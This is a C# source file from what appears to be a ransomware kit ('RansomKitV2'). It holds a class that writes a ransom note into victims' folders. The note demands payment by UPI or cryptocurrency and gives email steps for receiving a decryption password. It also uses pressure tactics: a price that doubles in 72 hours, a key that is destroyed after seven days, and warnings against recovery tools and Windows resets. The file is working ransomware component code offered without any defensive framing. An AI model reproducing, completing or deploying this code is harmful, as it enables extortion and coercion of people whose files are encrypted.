using System;
using System.IO;

namespace RansomKitV2
{
    static class NoteDropper
    {
        const string NOTE_FILE = "README_YOUR_FILES_ARE_ENCRYPTED.txt";

        public static void Drop(string directory, string victimId,
                                string upiId,    string upiAmount,
                                string binance,  string email)
        {
            try
            {
                string path    = Path.Combine(directory, NOTE_FILE);
                string content = Build(victimId, upiId, upiAmount, binance, email);
                File.WriteAllText(path, content);
            }
            catch { }
        }

        static string Build(string id, string upi, string amount, string bnb, string mail)
            => $@"
╔═══════════════════════════════════════════════════════════════════╗
║          !!! ALL YOUR IMPORTANT FILES ARE ENCRYPTED !!!           ║
╚═══════════════════════════════════════════════════════════════════╝

Your documents, photos, videos, databases and other files have been
encrypted with AES-256-CBC.  You cannot open them without the
decryption password.

YOUR VICTIM ID: {id}
(Include this in every message to us)

════════════════════════  HOW TO RECOVER  ══════════════════════════

STEP 1 — Pay using ONE of the methods below.
STEP 2 — Take a screenshot of the payment confirmation.
STEP 3 — Email us at: {mail}
          Subject: DECRYPT-{id}
          Attach the screenshot.
STEP 4 — Receive your 44-character decryption password.
STEP 5 — Run the decryptor application and enter the password.

═══════════════════════════  PAYMENT  ══════════════════════════════

▶  OPTION 1  —  UPI (India)
   UPI ID  :  {upi}
   Amount  :  ₹{amount}
   UPI URI :  upi://pay?pa={upi}&am={amount}&cu=INR&tn=FileDecryption
   Apps    :  PhonePe / Google Pay / Paytm / BHIM / any UPI app

▶  OPTION 2  —  Crypto (International / Binance)
   Network :  BNB Smart Chain (BEP-20) or Bitcoin
   Address :  {bnb}
   Amount  :  0.05 BTC  OR  50 USDT

═══════════════════════════  WARNING  ══════════════════════════════

✗  Do NOT rename or delete any .locked files.
✗  Do NOT use third-party decryption tools — your files will be corrupted.
✗  Do NOT reinstall, reset, or recover Windows.

→  Attempting a Windows Reset or System Restore WILL trigger
   permanent deletion of all encrypted files.
   After that, even paying us will NOT recover your data.

⏱  Price doubles in 72 hours.
⏱  After 7 days the master key is permanently destroyed.

════════════════════════════════════════════════════════════════════
";
    }
}
